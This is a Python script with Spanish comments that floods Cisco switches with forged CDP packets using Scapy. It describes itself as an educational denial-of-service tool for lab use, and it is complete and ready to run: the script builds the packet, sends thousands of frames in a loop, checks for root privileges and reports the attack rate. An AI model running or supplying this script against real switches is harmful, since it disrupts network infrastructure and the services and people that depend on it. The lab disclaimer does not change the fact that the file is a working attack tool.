#!/usr/bin/env python3
"""
Script de DoS mediante protocolo CDP
Objetivo: Sobrecargar switches Cisco enviando paquetes CDP masivos

ADVERTENCIA: Solo para fines educativos en laboratorios controlados
Autor: [Tu Nombre]
Fecha: Febrero 2026
"""

from scapy.all import *
from scapy.contrib.cdp import *
import time
import sys
import os

def cdp_dos(interface, target_ip, count=1000, delay=0.001):
    """
    Realiza un ataque DoS enviando paquetes CDP masivos
    
    Args:
        interface: Interfaz de red a usar (ej: 'eth0')
        target_ip: Dirección IP del switch objetivo
        count: Número de paquetes a enviar
        delay: Retardo entre paquetes en segundos
    """
    print(f"[*] Iniciando ataque DoS CDP contra {target_ip}")
    print(f"[*] Usando interfaz: {interface}")
    print(f"[*] Enviando {count} paquetes...")
    print(f"[*] Delay entre paquetes: {delay}s\n")
    
    # Construir paquete CDP
    cdp_packet = Ether(dst="01:00:0c:cc:cc:cc") / \
                 LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
                 SNAP(OUI=0x00000c, code=0x2000) / \
                 CDPv2_HDR(vers=2, ttl=180) / \
                 CDPMsgDeviceID(val="ATTACKER-DOS") / \
                 CDPMsgPortID(val="Ethernet0") / \
                 CDPMsgCapabilities(cap=0x00000028) / \
                 CDPMsgSoftwareVersion(val="Scapy CDP DoS") / \
                 CDPMsgPlatform(val="Linux x86_64")
    
    try:
        sent = 0
        start_time = time.time()
        
        for i in range(count):
            sendp(cdp_packet, iface=interface, verbose=0)
            sent += 1
            
            # Mostrar progreso cada 100 paquetes
            if sent % 100 == 0:
                elapsed = time.time() - start_time
                rate = sent / elapsed if elapsed > 0 else 0
                print(f"[+] Enviados {sent}/{count} paquetes CDP... ({rate:.1f} pps)")
                sys.stdout.flush()
            
            time.sleep(delay)
        
        # Estadísticas finales
        total_time = time.time() - start_time
        avg_rate = sent / total_time if total_time > 0 else 0
        print(f"\n[✓] Ataque completado")
        print(f"[✓] Total paquetes enviados: {sent}")
        print(f"[✓] Tiempo total: {total_time:.2f}s")
        print(f"[✓] Tasa promedio: {avg_rate:.1f} pps")
        
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[!] Ataque interrumpido por el usuario")
        print(f"[!] Total paquetes enviados: {sent}")
        print(f"[!] Tiempo de ejecución: {elapsed:.2f}s")
    except Exception as e:
        print(f"[!] Error durante el ataque: {e}")

def show_banner():
    """Muestra el banner del script"""
    banner = """
    ╔═══════════════════════════════════════════╗
    ║     CDP DoS Attack - Educational Tool     ║
    ║     Cisco Discovery Protocol Flooding     ║
    ╚═══════════════════════════════════════════╝
    """
    print(banner)

if __name__ == "__main__":
    show_banner()
    
    # Configuración según tu topología
    INTERFACE = "eth0"              # Interfaz de red de Kali
    TARGET_SWITCH = "11.6.5.1"      # IP del switch o router
    PACKET_COUNT = 5000             # Número de paquetes
    DELAY = 0.001                   # 1ms entre paquetes
    
    print("=== ATAQUE DoS MEDIANTE CDP ===")
    print("ADVERTENCIA: Solo para fines educativos en laboratorios controlados\n")
    
    # Verificar permisos de root
    if os.geteuid() != 0:
        print("[!] ERROR: Este script requiere privilegios de superusuario")
        print("[!] Ejecuta con: sudo python3 cdp_dos_attack.py")
        sys.exit(1)
    
    # Confirmación del usuario
    print(f"Configuración:")
    print(f"  - Interfaz: {INTERFACE}")
    print(f"  - Target: {TARGET_SWITCH}")
    print(f"  - Paquetes: {PACKET_COUNT}")
    print(f"  - Delay: {DELAY}s\n")
    
    response = input("¿Continuar con el ataque? (s/n): ")
    if response.lower() != 's':
        print("[!] Ataque cancelado por el usuario")
        sys.exit(0)
    
    print()
    cdp_dos(INTERFACE, TARGET_SWITCH, PACKET_COUNT, DELAY)
